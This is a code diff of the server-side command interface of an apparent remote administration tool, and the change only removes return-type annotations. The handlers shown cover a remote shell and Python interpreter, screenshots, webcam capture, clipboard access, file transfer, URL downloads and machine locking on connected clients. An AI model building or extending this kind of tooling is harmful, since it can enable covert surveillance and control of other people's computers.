@@ -62,7 +62,7 @@ class ServerCLI(Server, cmd.Cmd):
         Server.__init__(self, address, ssl_context)
         cmd.Cmd.__init__(self)
 
-    def default(self, _) -> None:
+    def default(self, _):
         """ Default error if command not found """
         print('Command was not recognized, type "help" for help.')
 
@@ -71,7 +71,7 @@ class ServerCLI(Server, cmd.Cmd):
         self.shutdown()
         return True
 
-    def do_open(self, select_id: str) -> None:
+    def do_open(self, select_id: str):
         """ Interact with a client """
         if self.client is not None:
             print('A client has already been selected.')
@@ -96,7 +96,7 @@ class ServerCLI(Server, cmd.Cmd):
 
         self.prompt = f'{self.client.address[0]}> '
 
-    def do_exit(self, _) -> None:
+    def do_exit(self, _):
         """ Go back to the client selection menu """
         if self.client is None:
             print("No client is selected. To shutdown the server, use 'shutdown'.")
@@ -105,17 +105,17 @@ class ServerCLI(Server, cmd.Cmd):
         self.client = None
         self.prompt = '> '
 
-    def do_list(self, _) -> None:
+    def do_list(self, _):
         """ CLI for list """
         for client in self.clients():
             print(f'Port: {client.port} / Address: {client.address[0]}')
 
-    def do_help(self, _) -> None:
+    def do_help(self, _):
         """ Print help message """
         print(INTERACT_HELP if self.client else MENU_HELP)
 
     @terminal.require_client
-    def do_ping(self, _) -> None:
+    def do_ping(self, _):
         """ Get client latency """
         try:
             latency = network.ping(self.client)
@@ -126,7 +126,7 @@ class ServerCLI(Server, cmd.Cmd):
 
     @terminal.require_client
     @terminal.ignore(KeyboardInterrupt)
-    def do_shell(self, _) -> None:
+    def do_shell(self, _):
         """ Open a shell to client """
         # Fetch current working directory
         cwd = self.client.cwd()
@@ -171,7 +171,7 @@ class ServerCLI(Server, cmd.Cmd):
 
     @terminal.require_client
     @terminal.ignore(KeyboardInterrupt)
-    def do_python(self, _) -> None:
+    def do_python(self, _):
         """ Open a python interpreter to client """
         logging.debug('Launched python interpreter (%s)', self.client.port)
         while True:
@@ -183,7 +183,7 @@ class ServerCLI(Server, cmd.Cmd):
             print(shells.python(self.client, command), end='')
 
     @terminal.require_client
-    def do_screenshot(self, _) -> None:
+    def do_screenshot(self, _):
         """ Take a screenshot and save it in a file """
         try:
             filename = screenshot.screenshot(self.client)
@@ -193,7 +193,7 @@ class ServerCLI(Server, cmd.Cmd):
             print(f'Saved screenshot: {filename}')
 
     @terminal.require_client
-    def do_webcam(self, _) -> None:
+    def do_webcam(self, _):
         """ Capture webcam """
         try:
             filename = webcam.webcam(self.client)
@@ -203,7 +203,7 @@ class ServerCLI(Server, cmd.Cmd):
             print(f'Saved webcam capture: {filename}')
 
     @terminal.require_client
-    def do_copy(self, _) -> None:
+    def do_copy(self, _):
         """ Copy to client clipboard """
         text = input('Text to copy: ')
         try:
@@ -214,7 +214,7 @@ class ServerCLI(Server, cmd.Cmd):
             print('Copied to clipboard successfully')
 
     @terminal.require_client
-    def do_paste(self, _) -> None:
+    def do_paste(self, _):
         """ Paste from client clipboard """
         try:
             content = clipboard.paste(self.client)
@@ -224,7 +224,7 @@ class ServerCLI(Server, cmd.Cmd):
             print(f'Clipboard:\n"{content}"')
 
     @terminal.require_client
-    def do_receive(self, _) -> None:
+    def do_receive(self, _):
         """ Receive a file from the client """
         filename = input('File to transfer: ')
         save_name = input('Save file as: ')
@@ -236,7 +236,7 @@ class ServerCLI(Server, cmd.Cmd):
             print('File transferred successfully')
 
     @terminal.require_client
-    def do_send(self, _) -> None:
+    def do_send(self, _):
         """ Send a file to client """
         filename = input('Filename: ')
         save_name = input('Save file as: ')
@@ -252,7 +252,7 @@ class ServerCLI(Server, cmd.Cmd):
             print('File transferred successfully')
 
     @terminal.require_client
-    def do_download(self, _) -> None:
+    def do_download(self, _):
         """ Make the client download a file from the web """
         url = input('File URL: ')
         filename = input('Save file as: ')
@@ -264,7 +264,7 @@ class ServerCLI(Server, cmd.Cmd):
             print("File is downloading in the background.")
 
     @terminal.require_client
-    def do_lock(self, _) -> None:
+    def do_lock(self, _):
         """ Lock client machine """
         try:
             windows.lock_machine(self.client)
@@ -274,13 +274,13 @@ class ServerCLI(Server, cmd.Cmd):
             print('Successfully locked client machine.')
 
     @terminal.require_client
-    def do_tasks(self, _) -> None:
+    def do_tasks(self, _):
         """ Fetch all running tasks """
         self.client.tasklist = tasks.tasks(self.client)
         terminal.task_print(self.client.tasklist)
 
     @terminal.require_client
-    def do_stoptask(self, task_id: str) -> None:
+    def do_stoptask(self, task_id: str):
         """ Stop a task on a client """
         task_id = task_id.strip()
 
@@ -302,7 +302,7 @@ class ServerCLI(Server, cmd.Cmd):
             print('Stopped task.')
 
     @terminal.require_client
-    def do_output(self, task_id: str) -> None:
+    def do_output(self, task_id: str):
         """ Given a task id, get output from finished task from client """
         task_id = task_id.strip()
 
@@ -324,7 +324,7 @@ class ServerCLI(Server, cmd.Cmd):
             print(output)
 
     @terminal.require_client
-    def do_disconnect(self, _) -> None:
+    def do_disconnect(self, _):
         """ Disconnect a client """
         self.disconnect(self.client)
         print("Disconnected client.")
